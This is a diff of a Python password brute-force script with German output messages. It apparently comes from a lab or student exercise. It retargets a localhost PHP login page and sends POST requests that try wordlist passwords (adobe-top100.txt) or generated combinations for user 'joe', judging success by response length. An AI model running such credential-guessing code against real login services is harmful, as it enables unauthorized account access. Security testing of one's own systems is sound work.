@@ -15,7 +15,7 @@ test_key_counter = []
 passwords = []
 check_array = []
 
-url = 'http://172.50.1.5:8080/validate?'
+url = 'http://localhost/Allerkamp-Luecking/php/login.php'
 session = requests.Session()
 
 f = open('adobe-top100.txt', 'r')
@@ -50,8 +50,8 @@ def execute_hack(x):
 
     global test_key_counter
     if user_input == 'joe':
-        local_url = url + 'benutzername=' + user_input + '&passwort=' + passwords[x]
-        r = session.get(local_url)
+        local_url = url + 'benutzername=' + user_input + '&pwd=' + passwords[x]
+        r = session.post(url, data={'username': user_input, 'pwd': passwords[x]})
         test_key_counter.append('k')
         if len(r.text) == 21:
             elapsed_time = time.time() - start_time
@@ -63,10 +63,10 @@ def execute_hack(x):
             print('Getestete Keys: ' + str(len(test_key_counter)))
 
     else:
-        local_url = url + 'benutzername=' + user_input + '&passwort=' + ''.join(combination_array[x])
-        r = session.get(local_url)
+        r = session.post(url, data={'username': user_input, 'pwd': combination_array[x]})
         test_key_counter.append('k')
-        if len(r.text) == 21:
+        length = len(r.text)
+        if length > 12:
             elapsed_time = time.time() - start_time
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + ''.join(combination_array[x]))
